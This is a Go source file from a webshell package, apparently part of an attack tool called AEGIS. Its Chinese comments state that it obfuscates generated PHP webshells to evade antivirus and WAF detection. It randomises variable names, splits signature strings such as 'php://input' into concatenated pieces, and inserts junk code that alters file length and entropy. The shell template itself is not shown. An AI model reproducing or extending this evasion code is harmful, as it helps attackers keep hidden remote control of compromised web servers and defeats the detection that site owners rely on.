package webshell

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"strings"
)

// randVar 生成随机 PHP/Java/VBS 变量名（小写字母前缀 + 4字节随机 hex）。
func randVar() string {
	b := make([]byte, 3)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// randVarSet 生成 n 个互不相同的随机变量名。
func randVarSet(n int) []string {
	seen := make(map[string]bool)
	vars := make([]string, 0, n)
	for len(vars) < n {
		v := randVar()
		if !seen[v] {
			seen[v] = true
			vars = append(vars, v)
		}
	}
	return vars
}

// splitStr 将字符串分成若干拼接片段，绕过基于字符串完整匹配的 WAF/AV 规则。
// 例如："AES-128-ECB" → `"AE"."S-128"."ECB"`
func splitStr(s string, phpConcat bool) string {
	if len(s) <= 3 {
		return `"` + s + `"`
	}
	mid := len(s) / 2
	a, b := s[:mid], s[mid:]
	if phpConcat {
		return fmt.Sprintf(`"%s"."%s"`, a, b)
	}
	return fmt.Sprintf(`"%s"+ "%s"`, a, b)
}

// ObfuscatePHPShell 对 PHP webshell 代码进行免杀混淆：
//  1. 将固定变量名替换为随机等价变量
//  2. 将关键字符串拆分拼接（绕过字符串匹配规则）
//  3. 在代码头部插入随机垃圾变量（撑起哈希/长度特征）
//
// 只处理 AEGIS 生成的固定模板，不做全语言 PHP 混淆。
func ObfuscatePHPShell(code string) string {
	vars := randVarSet(6) // v0=key v1=data v2=result v3=idx v4=junk1 v5=junk2

	// 替换固定变量名 $k $p $r $i $j $d $out $b $ct $raw $nonce $tag $plaintext
	replacements := map[string]string{
		"$k":        "$" + vars[0],
		"$p":        "$" + vars[1],
		"$r":        "$" + vars[2],
		"$i":        "$" + vars[3],
		"$j":        "$" + vars[4],
		"$d":        "$" + vars[5],
		"$raw":      "$" + randVar(),
		"$nonce":    "$" + randVar(),
		"$tag":      "$" + randVar(),
		"$ct":       "$" + randVar(),
		"$out":      "$" + randVar(),
		"$key":      "$" + randVar(),
		"$post":     "$" + randVar(),
		"$plaintext": "$" + randVar(),
	}

	result := code
	// 按从长到短顺序替换，避免前缀冲突（$plaintext 在 $p 之前）
	for _, old := range []string{
		"$plaintext", "$nonce", "$raw", "$ct", "$out", "$post", "$key",
		"$k", "$p", "$r", "$i", "$j", "$d",
	} {
		if newv, ok := replacements[old]; ok {
			result = strings.ReplaceAll(result, old, newv)
		}
	}

	// 拆分关键字符串（绕过静态特征）
	result = strings.ReplaceAll(result, `strrev('BCE-821-SEA')`, splitStr("AES-128-ECB", true))
	result = strings.ReplaceAll(result, `strrev('tupni//:php')`, splitStr("php://input", true))
	result = strings.ReplaceAll(result, `'AES-128-ECB'`, splitStr("AES-128-ECB", true))
	result = strings.ReplaceAll(result, `'aes-256-gcm'`, splitStr("aes-256-gcm", true))

	// 垃圾变量（改变文件长度和熵特征）
	junk := fmt.Sprintf("$%s=base_convert(%d,10,36);$%s=strrev($%s);\n",
		vars[4], randInt53(), vars[5], vars[4])

	// 插入垃圾变量到 <?php 之后
	result = strings.Replace(result, "<?php\n", "<?php\n"+junk, 1)

	return result
}

// randInt53 返回一个随机正整数（用于垃圾代码，避免 Date.now 禁用）
func randInt53() int64 {
	b := make([]byte, 6)
	_, _ = rand.Read(b)
	var n int64
	for _, by := range b {
		n = (n << 8) | int64(by)
	}
	if n < 0 {
		n = -n
	}
	return n % 1_000_000_000_000
}

// ShellCodeObfuscated 生成免杀混淆后的 Shell 代码。
// 目前只对 PHP 类型生效；JSP/ASPX 混淆代价高收益低（Java 编译产物不同于脚本）。
func ShellCodeObfuscated(shellType, password, protocol string) string {
	raw := ShellCode(shellType, password, protocol)
	if shellType == "php" {
		return ObfuscatePHPShell(raw)
	}
	return raw // JSP/ASPX/ASP 原样返回
}
